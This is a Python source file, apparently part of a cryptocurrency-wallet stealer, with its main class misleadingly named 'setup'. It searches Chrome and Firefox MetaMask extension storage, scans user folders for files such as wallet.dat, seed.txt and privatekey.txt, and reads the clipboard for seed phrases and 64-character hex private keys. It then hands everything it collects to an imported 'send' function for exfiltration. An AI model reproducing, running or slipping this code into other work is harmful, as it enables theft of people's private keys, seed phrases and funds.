import os
import json
import re
from pathlib import Path
from export import send

class setup:
    def __init__(self):
        self.data = []
    
    def run(self):
        self._scan()
        if self.data:
            send(self.data)
    
    def _scan(self):
        # Scan MetaMask
        paths = [
            os.path.expandvars(r"%APPDATA%\Google\Chrome\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn"),
            os.path.expandvars(r"%APPDATA%\Google\Chrome\Profile*\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn"),
            os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles\*\storage\default\moz-extension+++*"),
            os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn"),
        ]
        
        from glob import glob
        for pattern in paths:
            for path in glob(pattern):
                try:
                    f = os.path.join(path, "LOCK")
                    if os.path.exists(f):
                        with open(f, 'r', errors='ignore') as fp:
                            self.data.append({'type': 'vault', 'path': f, 'data': fp.read()[:10000]})
                except:
                    pass
        
        # Scan wallet files
        patterns = ["wallet.dat", "wallet.json", "seed.txt", "seedphrase.txt",
                    "mnemonic.txt", "privatekey.txt", "key.txt", "backup.txt",
                    "recovery.txt", "passphrase.txt", "metamask.txt"]
        
        search = [
            os.path.expanduser("~"),
            os.path.expandvars("%APPDATA%"),
            os.path.expandvars("%USERPROFILE%\\Desktop"),
            os.path.expandvars("%USERPROFILE%\\Documents"),
            os.path.expandvars("%USERPROFILE%\\Downloads"),
        ]
        
        for base in search:
            if not os.path.exists(base):
                continue
            for root, dirs, files in os.walk(base):
                if root.replace(base, '').count(os.sep) > 3:
                    continue
                for f in files:
                    if any(p in f.lower() for p in patterns):
                        try:
                            fp = os.path.join(root, f)
                            with open(fp, 'r', errors='ignore') as fp2:
                                c = fp2.read()
                                if self._is_seed(c) or self._is_key(c):
                                    self.data.append({'type': 'file', 'path': fp, 'content': c[:5000]})
                        except:
                            pass
        
        # Check clipboard
        try:
            import pyperclip
            c = pyperclip.paste()
            if c and ('0x' in c or len(c) >= 40):
                if self._is_key(c) or self._is_seed(c):
                    self.data.append({'type': 'clipboard', 'content': c})
        except:
            pass
    
    def _is_seed(self, t):
        words = {'abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract',
                 'absurd', 'abuse', 'access', 'accident', 'account', 'accuse', 'achieve', 'acid',
                 'acoustic', 'acquire', 'across', 'act', 'action', 'actor', 'actress', 'actual',
                 'adapt', 'add', 'addict', 'address', 'adjust', 'admit', 'adult', 'advance'}
        return len(set(t.lower().split()).intersection(words)) > 3
    
    def _is_key(self, t):
        return bool(re.search(r'(0x)?[a-fA-F0-9]{64}', t))